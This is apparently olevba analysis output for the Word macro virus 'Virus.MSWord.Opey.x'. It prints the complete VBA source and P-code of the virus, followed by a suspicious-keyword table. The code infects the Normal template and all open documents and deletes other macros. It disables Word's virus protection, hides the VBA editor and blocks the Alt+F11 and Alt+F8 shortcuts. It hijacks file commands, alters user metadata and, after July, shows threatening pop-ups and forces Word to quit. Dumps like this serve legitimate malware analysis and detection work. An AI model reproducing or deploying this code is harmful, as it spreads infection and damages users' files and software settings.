olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Crazy_Man_06.bas 
in file: Virus.MSWord.Opey.x - OLE stream: 'Macros/VBA/Crazy_Man_06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AkoLang()
  On Error Resume Next
  System.Cursor = wdCursorNormal
      Call Crazy_01
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If (clan = "MyForm1") And (clan = "Crazy_Man_06") Then NTInfected = True
                If (clan <> "MyForm1") And (clan <> "Crazy_Man_06") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
             For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If (clan = "MyForm1") And (clan = "Crazy_Man_06") Then ODInfected = True
                    If (clan <> "MyForm1") And (clan <> "Crazy_Man_06") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then
                    Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                     End If
                 Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Crazy_Man_06", Object:=wdOrganizerObjectProjectItems
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="MyForm1", Object:=wdOrganizerObjectProjectItems
                    If (Mid(opendoc.FullName, 2, 1) = ":") Then
                      filesSize = FileLen(opendoc.Name)
                       If (System.FreeDiskSpace <= filesSize) Then
                          MsgBox prompt:="Cant' Save " & opendoc.Name & " in Drive " & Mid(opendoc.FullName, 1, 1) & ":\ Disk is full, Please Insert Another Disk and Click Ok.."
                          If (System.FreeDiskSpace <= filesSize) Then
                            MsgBox prompt:="Disk Full Try to save to another drive.."
                             Dialogs(wdDialogFileSaveAs).Show
                              
                          End If
                          Else
                          opendoc.SaveAs FileName:=opendoc.FullName
                       End If
                      End If
                    
                    End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy_Man_06", Object:=wdOrganizerObjectProjectItems
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MyForm1", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
         
End Sub
Sub Crazy_01()
    On Error Resume Next
System.Cursor = wdCursorNormal
    If (Month(Now) > 7) Then
    Application.UserName = "Crazy Man"
    Application.UserAddress = "LBTMM B'99 PHILIPPINES"
    Application.UserInitials = "Crazy"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Crazy Man"
        .Title = "Crazy"
        .Manager = "MMA"
        .Company = "Crazy Man Company"
        .Comments = "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you think..."
        .Execute
    End With
    End If
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call AkoLang
    
    drive = Mid(ActiveDocument.FullName, 1, 1) + ":"
    ChangeFileOpenDirectory drive
    If (Mid(opendoc.FullName, 2, 1) = ":") Then
        filesSize = FileLen(opendoc.Name)
             If (System.FreeDiskSpace <= filesSize) Then
                    MsgBox prompt:="Cant' Save " & opendoc.Name & " in Drive " & Mid(opendoc.FullName, 1, 1) & ":\ Disk is full, Please Insert Another Disk and Click Ok.."
                  If (System.FreeDiskSpace <= filesSize) Then
                      MsgBox prompt:="Disk Full Try to save to another drive.."
                         Dialogs(wdDialogFileSaveAs).Show
                              
                   End If
               Else
                   opendoc.SaveAs FileName:=opendoc.FullName
          End If
    Else
    ActiveDocument.Save
      If (Month(Now()) > 7) Then
        With Dialogs(wdDialogFileSaveAs)
           .Name = "Crazy Man"
           .Show
           End With
           Else
           Dialogs(wdDialogFileSaveAs).Show
         End If
    End If
End Sub
Sub FileClose()
    On Error Resume Next
    Call AkoLang
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call AkoLang
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call AkoLang
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call AkoLang
End Sub
Sub AutoExec()
    On Error Resume Next
    Call AutoRun
    Call AkoLang
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call AkoLang
    If (Month(Now()) > 7) Then
    With Dialogs(wdDialogFileSaveAs)
        .Name = "Crazy Man"
        .Show
     End With
     Else
     With Dialogs(wdDialogFileSaveAs)
        .Show
     End With
     End If
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call AkoLang
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call AkoLang
    If (Month(Now()) > 7) Then
    ActiveDocument.PrintOut
    Else
    Dialogs(wdDialogFilePrint).Show
    End If
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call AkoLang
End Sub

Sub ToolsMacro()
On Error Resume Next
    MsgBox prompt:="AHA! You want to know about my Macro Code..  Kill Me FIRST..", Title:="The Crazy Man"
    On Error Resume Next
  
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoRun()
'System.Application.ChangeFileOpenDirectory "a:"
'MsgBox System.FreeDiskSpace
If (Month(Now()) > 7) Then
Application.OnTime TimeValue("3:00.pm"), Name:="pray"
Application.OnTime TimeValue("12:05.pm"), Name:="Lunch"
End If
End Sub

Sub pray()
On Error Resume Next
MsgBox prompt:="It's 3:00 P.M., Please Pray The salvation of your Life, cuase you don't know it's is the time for you to die...", Title:="The Crazy Man", buttons:=vbInformation
End Sub

Sub Lunch()
On Error Resume Next
MsgBox prompt:="It's 12:00 it's time for Lunch...", Title:="The Crazy Man", buttons:=vbInformation
On Error Resume Next
ActiveDocument.Save
Application.Quit
End Sub


Sub FormatColumns()
On Error Resume Next
If (Month(Now()) > 7) Then

MsgBox "It's better for you to work with MicroSoft Excel. Click Ok", buttons:=vbInformation
Else
  Dialogs(wdDialogFormatColumns).Show
End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.x
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Crazy_Man_06 - 16403 bytes
' Line #0:
' 	FuncDefn (Sub AkoLang())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #3:
' 	ArgsCall (Call) Crazy_01 0x0000 
' Line #4:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #5:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #6:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #7:
' 	Ld clan 
' 	LitStr 0x0007 "MyForm1"
' 	Eq 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_06"
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #8:
' 	Ld clan 
' 	LitStr 0x0007 "MyForm1"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_06"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #11:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #12:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #13:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #14:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #15:
' 	Ld clan 
' 	LitStr 0x0007 "MyForm1"
' 	Eq 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_06"
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #16:
' 	Ld clan 
' 	LitStr 0x0007 "MyForm1"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "Crazy_Man_06"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #17:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "Crazy_Man_06"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "MyForm1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	Ld opendoc 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #24:
' 	Ld opendoc 
' 	MemLd New 
' 	ArgsLd FileLen 0x0001 
' 	St filesSize 
' Line #25:
' 	Ld System 
' 	MemLd FreeDiskSpace 
' 	Ld filesSize 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #26:
' 	LitStr 0x000B "Cant' Save "
' 	Ld opendoc 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x000A " in Drive "
' 	Concat 
' 	Ld opendoc 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	LitStr 0x003A ":\ Disk is full, Please Insert Another Disk and Click Ok.."
' 	Concat 
' 	ParamNamed prompt 
' 	ArgsCall MsgBox 0x0001 
' Line #27:
' 	Ld System 
' 	MemLd FreeDiskSpace 
' 	Ld filesSize 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0028 "Disk Full Try to save to another drive.."
' 	ParamNamed prompt 
' 	ArgsCall MsgBox 0x0001 
' Line #29:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #30:
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndWith 
' Line #39:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "Crazy_Man_06"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "MyForm1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #43:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub Crazy_01())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #50:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #51:
' 	LitStr 0x0009 "Crazy Man"
' 	Ld Application 
' 	MemSt UserName 
' Line #52:
' 	LitStr 0x0016 "LBTMM B'99 PHILIPPINES"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #53:
' 	LitStr 0x0005 "Crazy"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #54:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #55:
' 	LitStr 0x0009 "Crazy Man"
' 	MemStWith Author 
' Line #56:
' 	LitStr 0x0005 "Crazy"
' 	MemStWith Title 
' Line #57:
' 	LitStr 0x0003 "MMA"
' 	MemStWith Manager 
' Line #58:
' 	LitStr 0x0011 "Crazy Man Company"
' 	MemStWith Company 
' Line #59:
' 	LitStr 0x006D "HELLO I am the Crazy Man From the Crazy World of Computer. Don't you worry I'm not as crazy than you think..."
' 	MemStWith Comments 
' Line #60:
' 	ArgsMemCallWith Execute 0x0000 
' Line #61:
' 	EndWith 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #64:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #66:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #67:
' 	EndWith 
' Line #68:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #69:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #70:
' 	EndWith 
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #73:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #74:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #75:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #76:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #77:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #78:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub FileSave())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #83:
' Line #84:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Add 
' 	St drive 
' Line #85:
' 	Ld drive 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #86:
' 	Ld opendoc 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #87:
' 	Ld opendoc 
' 	MemLd New 
' 	ArgsLd FileLen 0x0001 
' 	St filesSize 
' Line #88:
' 	Ld System 
' 	MemLd FreeDiskSpace 
' 	Ld filesSize 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #89:
' 	LitStr 0x000B "Cant' Save "
' 	Ld opendoc 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x000A " in Drive "
' 	Concat 
' 	Ld opendoc 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	LitStr 0x003A ":\ Disk is full, Please Insert Another Disk and Click Ok.."
' 	Concat 
' 	ParamNamed prompt 
' 	ArgsCall MsgBox 0x0001 
' Line #90:
' 	Ld System 
' 	MemLd FreeDiskSpace 
' 	Ld filesSize 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #91:
' 	LitStr 0x0028 "Disk Full Try to save to another drive.."
' 	ParamNamed prompt 
' 	ArgsCall MsgBox 0x0001 
' Line #92:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #93:
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	ElseBlock 
' Line #96:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	ElseBlock 
' Line #99:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #100:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #101:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #102:
' 	LitStr 0x0009 "Crazy Man"
' 	MemStWith New 
' Line #103:
' 	ArgsMemCallWith Show 0x0000 
' Line #104:
' 	EndWith 
' Line #105:
' 	ElseBlock 
' Line #106:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub FileClose())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #113:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub FileExit())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #118:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #119:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub FileNew())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #124:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #125:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub AutoOpen())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #130:
' 	EndSub 
' Line #131:
' 	FuncDefn (Sub AutoExec())
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	ArgsCall (Call) AutoRun 0x0000 
' Line #134:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub FileSaveAs())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #139:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #140:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #141:
' 	LitStr 0x0009 "Crazy Man"
' 	MemStWith New 
' Line #142:
' 	ArgsMemCallWith Show 0x0000 
' Line #143:
' 	EndWith 
' Line #144:
' 	ElseBlock 
' Line #145:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #146:
' 	ArgsMemCallWith Show 0x0000 
' Line #147:
' 	EndWith 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub FilePageSetup())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #153:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub FilePrint())
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #158:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #159:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #160:
' 	ElseBlock 
' Line #161:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub FileOpen())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #167:
' 	ArgsCall (Call) AkoLang 0x0000 
' Line #168:
' 	EndSub 
' Line #169:
' Line #170:
' 	FuncDefn (Sub ToolsMacro())
' Line #171:
' 	OnError (Resume Next) 
' Line #172:
' 	LitStr 0x003C "AHA! You want to know about my Macro Code..  Kill Me FIRST.."
' 	ParamNamed prompt 
' 	LitStr 0x000D "The Crazy Man"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' Line #175:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #176:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #177:
' 	EndSub 
' Line #178:
' Line #179:
' 	FuncDefn (Sub AutoRun())
' Line #180:
' 	QuoteRem 0x0000 0x002F "System.Application.ChangeFileOpenDirectory "a:""
' Line #181:
' 	QuoteRem 0x0000 0x001B "MsgBox System.FreeDiskSpace"
' Line #182:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #183:
' 	LitStr 0x0007 "3:00.pm"
' 	ArgsLd TimeValue 0x0001 
' 	LitStr 0x0004 "pray"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #184:
' 	LitStr 0x0008 "12:05.pm"
' 	ArgsLd TimeValue 0x0001 
' 	LitStr 0x0005 "Lunch"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	EndSub 
' Line #187:
' Line #188:
' 	FuncDefn (Sub pray())
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' 	LitStr 0x006F "It's 3:00 P.M., Please Pray The salvation of your Life, cuase you don't know it's is the time for you to die..."
' 	ParamNamed prompt 
' 	LitStr 0x000D "The Crazy Man"
' 	ParamNamed Title 
' 	Ld vbInformation 
' 	ParamNamed buttons 
' 	ArgsCall MsgBox 0x0003 
' Line #191:
' 	EndSub 
' Line #192:
' Line #193:
' 	FuncDefn (Sub Lunch())
' Line #194:
' 	OnError (Resume Next) 
' Line #195:
' 	LitStr 0x0021 "It's 12:00 it's time for Lunch..."
' 	ParamNamed prompt 
' 	LitStr 0x000D "The Crazy Man"
' 	ParamNamed Title 
' 	Ld vbInformation 
' 	ParamNamed buttons 
' 	ArgsCall MsgBox 0x0003 
' Line #196:
' 	OnError (Resume Next) 
' Line #197:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #198:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #199:
' 	EndSub 
' Line #200:
' Line #201:
' Line #202:
' 	FuncDefn (Sub FormatColumns())
' Line #203:
' 	OnError (Resume Next) 
' Line #204:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #205:
' Line #206:
' 	LitStr 0x003A "It's better for you to work with MicroSoft Excel. Click Ok"
' 	Ld vbInformation 
' 	ParamNamed buttons 
' 	ArgsCall MsgBox 0x0002 
' Line #207:
' 	ElseBlock 
' Line #208:
' 	Ld wdDialogFormatColumns 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #209:
' 	EndIfBlock 
' Line #210:
' Line #211:
' 	EndSub 
' Line #212:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
